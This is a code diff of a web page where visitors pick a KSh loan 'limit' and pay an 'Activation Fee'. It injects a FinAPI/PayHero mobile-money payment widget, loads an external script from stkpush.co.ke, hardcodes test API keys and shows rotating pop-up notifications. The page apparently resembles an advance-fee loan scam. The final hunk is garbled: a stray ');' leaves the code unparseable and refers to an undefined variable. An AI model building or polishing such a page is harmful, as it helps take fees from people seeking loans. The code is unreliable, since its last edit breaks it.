@@ -49,7 +49,6 @@
         .top-notif .avatar { width: 35px; height: 35px; font-size: 18px; background: #00a651; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; }        
         .error { color: #d32f2f; font-size: 12px; margin-top: 5px; display: none; }
     </style>        
-    <script src="https://stkpush.co.ke/static/js/finapi-widget.min.js"></script>
 </head>        
 <body>  
 
@@ -130,13 +129,7 @@
             <div class="summary-box"><span>Selected Limit:</span> <span>KSh <span id="sLimit">75,000</span></span></div>        
             <div class="summary-box"><span>Activation Fee:</span> <span>KSh <span id="sFee">900</span></span></div>        
             
-            <!-- FinAPI Payment Widget -->
-            <div id="finapi-container" class="finapi-widget" 
-                 data-api-key="sk_test_22617d4a47a044ecb7eacbf459437ea3" 
-                 data-amount="100" 
-                 data-color="#00a651"
-                 data-provider="payhero">
-            </div>
+            <div id="widget-wrapper"></div>
         
         </div>        
     </div>        
@@ -228,10 +221,44 @@ function selectLimit(limit, fee){
     document.getElementById('sLimit').innerText = limit.toLocaleString();
     document.getElementById('sFee').innerText = fee.toLocaleString();
     
-    const widgetEl = document.getElementById('finapi-container');
-    if(widgetEl) {
-        widgetEl.setAttribute('data-amount', fee);
+    // Dynamically inject the widget with the correct amount
+    const wrapper = document.getElementById('widget-wrapper');
+    if (wrapper) {
+        wrapper.innerHTML = `
+            <!-- FinAPI Payment Widget -->
+            <div id="finapi-container" class="finapi-widget" 
+                 data-api-key="sk_test_a1f9663668ca4e5fbb5644142039967b" 
+                 data-amount="${fee}" 
+                 data-color="#00a651"
+                 data-provider="payhero">
+            </div>
+        `;
+        
+        // Remove old script if exists to force re-initialization
+        const oldScript = document.getElementById('finapi-script');
+        if (oldScript) oldScript.remove();
+        
+        const script = document.createElement('script');
+        script.id = 'finapi-script';
+        script.src = 'https://stkpush.co.ke/static/js/finapi-widget.min.js';
+        
+        script.onload = () => {
+            const widgetEl = document.getElementById('finapi-container');
+            if (widgetEl) {
+                widgetEl.addEventListener('finapi:payment_success', (e) => {
+                    console.log('Success!', e.detail);
+                    document.getElementById('paidPhone').innerText = userData.phone || "your number";
+                    show(5);
+                });
+                widgetEl.addEventListener('finapi:payment_failed', (e) => {
+                    console.log('Failed!', e.detail);
+                    alert('Payment Failed: ' + (e.detail?.message || 'Please try again.'));
+                });
+            }
+        };
+        document.body.appendChild(script);
     }
+    
     setTimeout(()=>show(4), 300);
 }
 
@@ -293,13 +320,7 @@ function showTopNotif(){
 setTimeout(showTopNotif, 1000);
 setInterval(showTopNotif, 4000);
 
-const widget = document.getElementById('finapi-container');
-if (widget) {
-    widget.addEventListener('finapi:payment_success', (e) => {
-        console.log('Success!', e.detail);
-        document.getElementById('paidPhone').innerText = userData.phone || "your number";
-        show(5);
-    });
+);
     widget.addEventListener('finapi:payment_failed', (e) => {
         console.log('Failed!', e.detail);
         alert('Payment Failed: ' + (e.detail?.message || 'Please try again.'));
